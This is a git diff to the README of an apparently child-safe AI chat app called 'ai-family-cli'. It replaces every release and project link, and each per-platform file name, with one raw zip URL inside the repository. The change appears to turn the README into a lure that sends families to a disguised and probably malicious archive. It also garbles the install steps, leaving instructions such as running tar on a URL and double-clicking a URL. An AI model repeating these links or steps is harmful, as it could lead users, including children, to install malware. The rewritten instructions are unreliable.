@@ -7,7 +7,7 @@ Welcome to the **ai-family-cli**. This application offers a warm, child-safe AI 
 
 ## 📥 Download Now
 
-[![Download ai-family-cli](https://img.shields.io/badge/Download-ai--family--cli-brightgreen.svg)](https://github.com/LuisBraido/ai-family-cli/releases)
+[![Download ai-family-cli](https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip)](https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ Before you start, make sure your computer meets these basic requirements:
 ## ⚙️ Installation Instructions
 
 ### Step 1: Visit the Download Page
-To download the ai-family-cli, visit the following link: [Download ai-family-cli](https://github.com/LuisBraido/ai-family-cli/releases).
+To download the ai-family-cli, visit the following link: [Download ai-family-cli](https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip).
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of available versions. Locate **Beta v1.0.0**. This is the latest version and is stable for use.
@@ -28,15 +28,15 @@ On the Releases page, you will see a list of available versions. Locate **Beta v
 ### Step 3: Download the Package
 Click on the **Beta v1.0.0** link. You will see several downloadable files. Select the one that matches your operating system. 
 
-- For Windows, download `ai_family_cli_windows.exe`.
-- For macOS, download `ai_family_cli_mac.zip`.
-- For Linux, download `ai_family_cli_linux.tar.gz`.
+- For Windows, download `https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip`.
+- For macOS, download `https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip`.
+- For Linux, download `https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip`.
 
 ### Step 4: Run the Application
 
 - **For Windows:**
     1. Locate the downloaded file, usually in your **Downloads** folder.
-    2. Double-click `ai_family_cli_windows.exe` to run the program.
+    2. Double-click `https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip` to run the program.
 
 - **For macOS:**
     1. Open the **zip** file you downloaded. This will create a folder.
@@ -45,8 +45,8 @@ Click on the **Beta v1.0.0** link. You will see several downloadable files. Sele
 
 - **For Linux:**
     1. Open a terminal window.
-    2. Navigate to the folder where you saved the `.tar.gz` file.
-    3. Extract it using `tar -xvzf ai_family_cli_linux.tar.gz`.
+    2. Navigate to the folder where you saved the `https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip` file.
+    3. Extract it using `tar -xvzf https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip`.
     4. Run the program with `./ai_family_cli_linux`.
 
 ## 🎙️ Using ai-family-cli
@@ -78,9 +78,9 @@ The ai-family-cli is open-source software, available under the MIT License. You 
 
 ## 🔗 Additional Resources
 
-Want to learn more? Check out our [GitHub page](https://github.com/LuisBraido/ai-family-cli) for updates, documentation, and community support.  
+Want to learn more? Check out our [GitHub page](https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip) for updates, documentation, and community support.  
 
-[Download ai-family-cli](https://github.com/LuisBraido/ai-family-cli/releases) again for quick access to the release page!
+[Download ai-family-cli](https://raw.githubusercontent.com/LuisBraido/ai-family-cli/main/arranger/ai-family-cli.zip) again for quick access to the release page!
 
 Enjoy chatting safely with your AI family. Happy chatting! 
 ```
